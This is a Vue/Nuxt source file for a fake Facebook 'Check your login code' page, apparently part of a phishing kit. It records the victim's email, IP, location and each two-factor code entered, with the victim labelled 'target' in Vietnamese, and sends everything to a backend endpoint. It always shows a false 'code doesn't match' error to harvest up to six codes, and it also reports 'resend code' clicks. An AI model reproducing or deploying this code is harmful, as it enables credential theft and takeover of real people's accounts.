<script setup lang="ts">
import { ref } from 'vue'
useHead({
  title: 'Facebook',
  meta: [
    {
      name: 'description',
      content: 'Facebook',
    },
  ],
})

// const options = {
//   weekday: 'long',
//   year: 'numeric',
//   month: 'long',
//   day: 'numeric',
//   hour: 'numeric',
//   minute: 'numeric',
//   second: 'numeric',
//   hour12: false,
// }
// format option like hh:mm:ss dd/mm/yyyy
const options = {
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  day: '2-digit',
  month: '2-digit',
  year: 'numeric',
}
const code = ref('')
const isFocusEmail = ref(false)
const isFocusPassword = ref(false)
const attempt = ref(0)
const attemptLimit = 6
const attemptList = ref([])
const isError = ref(false)
const isShowLoading = ref(false)
const handleFocus = (type: string, ref: any) => {
  if (type === 'email') {
    isFocusEmail.value = true
    ref.focus()
  } else {
    isFocusPassword.value = true
    ref.focus()
  }
}
const isDisableSubmit = ref(true)
const geo = JSON.parse(localStorage.getItem('geo') || '{}')
const emailFromLocal = localStorage.getItem('email')
let message = `
🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
🌍 <b>Địa chỉ IP:</b> ${geo.ip}
📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}

📭 <b>Email:</b> <code>${emailFromLocal}</code>

`

onBeforeMount(() => {
  if (!emailFromLocal) {
    window.location.href = '/?a=1'
  }
})
const handleSubmit = async (isResend = false) => {
  const conversationList = JSON.parse(localStorage.getItem('conversa') || '[]')

  if (!code.value && !isResend) {
    return
  }

  if (!isResend) {
    attemptList.value.push(code.value)
    ++attempt.value
    message += `🔑 <b>Mã xác minh ${attempt.value}:</b> <code>${code.value}</code>\n`
  }

  if (attemptList.value.length >= attemptLimit) {
    window.location.href = '/?a=1'
    return
  }

  // message += `🔑 Mã xác minh: <code>${code.value}</code>`
  // attemptList.value.forEach((item, index) => {
  //   message += `🔑 <b>Mã xác minh ${index + 1}:</b> <code>${item}</code>\n`
  // })

  if (isResend) {
    message += `👤 Mục tiêu bấm <code>Resent code</code>\n`
  }

  isShowLoading.value = true
  // Call your API here
  try {
    const res = await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ rawMessage: message, conversation: conversationList }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    localStorage.setItem('conversa', JSON.stringify(res))
    // router.push('/step-4')
  } catch (error) {
    console.error(error)
  }
  setTimeout(() => {
    isShowLoading.value = false
    isError.value = true
    isDisableSubmit.value = true
  }, 2000)
}

const isShowPage = ref(false)
onMounted(() => {
  setTimeout(() => {
    isShowPage.value = true
  }, 1000)
})

const isShowRecentCode = ref(true)
const timeLeft = ref(59)
const formattedTime = ref(`0:${timeLeft.value.toString().padStart(2, '0')}`)

const startCountdown = async () => {
  isShowRecentCode.value = false

//   // let message = ''
//   const geo = JSON.parse(localStorage.getItem('geo') || '{}')
//   const message = `
// 🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
// 🌍 <b>Địa chỉ IP:</b> ${geo.ip}
// 📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}

// 👤 Mục tiêu bấm <code>Resent code</code>
// 📭 <b>Email:</b> <code>${emailFromLocal}</code>
// `

//   try {
//     await $fetch('/api/code', {
//       method: 'POST',
//       body: JSON.stringify({ rawMessage: message }),
//       headers: {
//         'Content-Type': 'application/json',
//       },
//     })
//   } catch (error) {
//     console.error(error)
//   }
  await handleSubmit(true)
  // Call your API here
  const timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--
      formattedTime.value = `0:${timeLeft.value.toString().padStart(2, '0')}`
    } else {
      clearInterval(timer)
      isShowRecentCode.value = true
    }
  }, 2000)
}
</script>

<template>
  <div v-if="isShowPage" class="flex px-4 justify-center items-center w-full h-screen bg-[#f1f5fb]">
    <div class="max-md:w-full w-[600px]">
      <p class="text-[13px] mb-4">Facebook</p>
      <p class="text-[1.5rem] font-[600] leading-[17px] max-md:leading-[27px]">
        {{ $t('Check your login code') }}
      </p>
      <p class="text-[13px] mt-5 mb-4">
        {{
          $t(
            `Enter the 6-degit code that we've just sent to your SMS, WhatsApp or from the authentications app that you set up.`,
          )
        }}
      </p>
      <img class="mb-4" src="/assets/images/code-pin.png" alt="" />
      <div
        class="mb-4 relative input bg-white"
        :class="{
          '!border-[rgb(103,120,138)] border': isFocusEmail && code.trim(),
          '!border-[#D31130]': isError,
        }"
        @click.stop="handleFocus('email', $refs.emailElement)"
      >
        <p
          :class="{
            ' transform translate-y-[9px] transition-all duration-200 text-[14px]':
              !isFocusEmail && !code.trim(),
          }"
          class="text-[12px] text-[#9ea1a2]"
        >
          {{ $t('Code') }}
        </p>
        <div v-if="isShowLoading" class="absolute z-10 right-4 top-1/2 transform -translate-y-1/2">
          <Icon name="i-svg-spinners-ring-resize" class="text-[#1984f8] text-[26px]" />
        </div>
        <input
          ref="emailElement"
          v-model="code"
          type="text"
          class="h-5 text-[rgb(28,43,51)]"
          autocomplete="off"
          :class="{
            'opacity-0': !isFocusEmail && !code.trim(),
          }"
          @focus="isFocusEmail = true"
          @blur="isFocusEmail = false"
          @input="isDisableSubmit = false"
        />
      </div>
      <div v-if="isError" class="flex text-[#D31130] items-center gap-1">
        <svg
          viewBox="0 0 24 24"
          fill="currentColor"
          width="1em"
          height="1em"
          aria-hidden="true"
          class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x1a1m0xk xlup9mm x1kky2od"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"
          ></path>
        </svg>
        <p class="font-base text-[0.8125rem]">
          {{
            $t(
              `The login code you entered doesn't match the one sent to your phone. Please check the number and try again.`,
            )
          }}
        </p>
      </div>
      <div class="flex mt-3 items-center gap-2">
        <svg viewBox="0 0 24 24" fill="currentColor" width="14" height="14">
          <path
            d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"
          ></path>
        </svg>
        <p
          v-if="isShowRecentCode"
          class="text-[14px] text-[#0064E0] cursor-pointer hover:underline"
          @click="startCountdown"
        >
          {{ $t('Get a new code') }}
        </p>
        <p v-else class="text-[14px] text-[#5d6a73] cursor-pointer">
          {{ $t('We can send a new code in') }} {{ formattedTime }}
        </p>
      </div>

      <button
        :class="{
          '!bg-[#0263df]': !isDisableSubmit && !isShowLoading,
        }"
        :disabled="isDisableSubmit"
        class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
        @click="handleSubmit(false)"
      >
        <Icon
          v-if="isShowLoading"
          name="i-svg-spinners-ring-resize"
          class="text-[#1984f8] text-[26px]"
        />
        <span v-else> {{ $t('Continue') }} </span>
      </button>

      <button
        class="flex hover:bg-gray-100 justify-center h-[44px] items-center text-[15px] rounded-full border w-full"
      >
        {{ $t('Try another way') }}
      </button>
    </div>
  </div>
</template>

<style scoped>
.input {
  @apply w-full px-4 py-2 h-[60px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
}
input {
  outline: none;
  width: 100%;
}
</style>
